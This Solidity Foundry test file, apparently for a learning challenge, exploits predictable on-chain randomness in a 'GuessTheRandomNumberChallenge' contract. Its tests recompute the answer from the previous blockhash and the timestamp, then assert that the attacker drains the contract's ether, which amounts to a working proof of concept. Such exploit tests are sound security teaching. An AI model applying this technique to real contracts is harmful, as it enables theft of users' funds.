pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {GuessTheRandomNumberChallenge} from "../src/GuessTheRandomNumberChallenge.sol";

contract TestWeakRandomnessGuessTheRandomNumberChallenge is Test {

    GuessTheRandomNumberChallenge public _contractUnderTest;
    
    uint256 deploymentBlockNumber;
    uint256 deploymentBlockTimestamp;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        
        deploymentBlockNumber = block.number;
        deploymentBlockTimestamp = block.timestamp;
        
        _contractUnderTest = new GuessTheRandomNumberChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue() public {
        vm.deal(address(this), 10 ether);

        uint8 expectedAnswer = uint8(uint256(keccak256(abi.encodePacked(
            blockhash(deploymentBlockNumber - 1),
            deploymentBlockTimestamp
        ))));

        uint256 balanceBefore = address(this).balance;
        
        _contractUnderTest.guess{value: 1 ether}(expectedAnswer);

        assertEq(_contractUnderTest.isComplete(), true, "Challenge should be complete after correct guess");
        assertEq(address(_contractUnderTest).balance, 0, "Contract balance should be 0 after successful guess");
        assertEq(address(this).balance, balanceBefore + 1 ether, "Attacker should have gained 1 ether");
    }

    function test_predictableRandomAcrossBlocks(uint256 blockNumber, uint256 blockTimestamp) public {
        vm.assume(blockNumber > 1);
        vm.assume(blockNumber < type(uint256).max - 1000);
        vm.assume(blockTimestamp > 0);
        vm.assume(blockTimestamp < type(uint256).max - 1000);

        vm.roll(blockNumber);
        vm.warp(blockTimestamp);

        vm.deal(address(this), 10 ether);

        GuessTheRandomNumberChallenge newChallenge = new GuessTheRandomNumberChallenge{value: 1 ether}();

        uint8 predictedAnswer = uint8(uint256(keccak256(abi.encodePacked(
            blockhash(blockNumber - 1),
            blockTimestamp
        ))));

        newChallenge.guess{value: 1 ether}(predictedAnswer);

        assertEq(newChallenge.isComplete(), true, "Randomness is predictable - challenge completed with predicted value");
    }

    receive() external payable {}
}
